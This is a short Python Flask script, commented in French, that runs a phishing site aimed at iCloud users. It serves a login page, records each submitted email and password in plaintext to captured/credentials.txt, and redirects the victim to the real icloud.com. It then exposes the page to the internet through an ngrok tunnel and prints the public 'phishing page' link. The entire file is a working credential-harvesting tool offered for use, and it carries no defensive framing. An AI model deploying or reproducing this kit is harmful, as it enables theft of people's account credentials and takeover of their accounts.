import os
import subprocess
import time
from flask import Flask, request, render_template, redirect

# Codes de couleur ANSI
GREEN = "\033[32m"
CYAN = "\033[36m"
RED = "\033[31m"
RESET = "\033[0m"

app = Flask(__name__)

# Dossier pour stocker les informations capturées
if not os.path.exists("captured"):
    os.makedirs("captured")


# Page de phishing
@app.route("/")
def index():
    return render_template("index.html")


# Route pour capturer les informations
@app.route("/submit", methods=["POST"])
def submit():
    email = request.form.get("login_email")
    password = request.form.get("login_password")

    # Enregistrer les informations dans un fichier
    with open("captured/credentials.txt", "a") as f:
        f.write(f"Email: {email}, Password: {password}\n")

    # Rediriger l'utilisateur vers une page légitime
    return redirect("https://www.icloud.com/")


# Démarrer Ngrok pour obtenir un lien public
def start_ngrok():
    # Chemin vers Ngrok (standard sous Linux)
    ngrok_path = "/usr/local/bin/ngrok"

    if not os.path.exists(ngrok_path):
        print(f"{RED}[!] Ngrok n'est pas installé. Veuillez l'installer.{RESET}")
        exit(1)

    print(f"{GREEN}[+] Démarrage de Ngrok...{RESET}")
    ngrok_process = subprocess.Popen(
        [ngrok_path, 'http', '8080'],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )

    # Attendre que Ngrok génère le lien
    time.sleep(5)
    for line in ngrok_process.stderr:
        if "ngrok" in line and "http" in line:
            public_url = line.strip().split()[-1]
            print(f"{GREEN}[+] Lien public Ngrok : {CYAN}{public_url}{RESET}")
            return public_url

    print(f"{RED}[!] Impossible d'obtenir le lien public Ngrok.{RESET}")
    exit(1)


# Démarrer le serveur Flask
def start_flask():
    print(f"{GREEN}[+] Démarrage du serveur Flask...{RESET}")
    app.run(host="0.0.0.0", port=8080, debug=False)  # Désactiver le mode debug pour éviter les redémarrages


# Fonction principale
def main():
    # Démarrer Ngrok et obtenir le lien public
    public_url = start_ngrok()

    # Afficher le lien public
    print(f"{GREEN}[+] Votre page de phishing est accessible à l'adresse : {CYAN}{public_url}{RESET}")

    # Démarrer le serveur Flask
    start_flask()


if __name__ == "__main__":
    # Démarrer Ngrok une seule fois
    if os.environ.get("WERKZEUG_RUN_MAIN") != "true":
        main()